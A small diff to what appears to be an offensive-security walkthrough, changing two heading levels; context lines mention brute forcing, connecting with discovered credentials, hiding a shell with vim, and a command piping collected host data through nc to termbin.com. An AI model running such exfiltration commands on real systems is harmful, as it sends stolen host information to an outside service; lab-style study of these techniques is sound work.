@@ -195,7 +195,7 @@ Now run the brute force exploit again and observe the behavior
 
 
 
-# Enumerating a Host
+## Enumerating a Host
 ------------
 
 connect to the target using the discovered credentials
@@ -216,7 +216,7 @@ Let's grab a copy of the information we've collected
 
     cat $HOSTNAME.txt | nc termbin.com 9999
     
-# privilage escalation 
+## privilage escalation 
 ------------
 Use vim to hide our shell
 
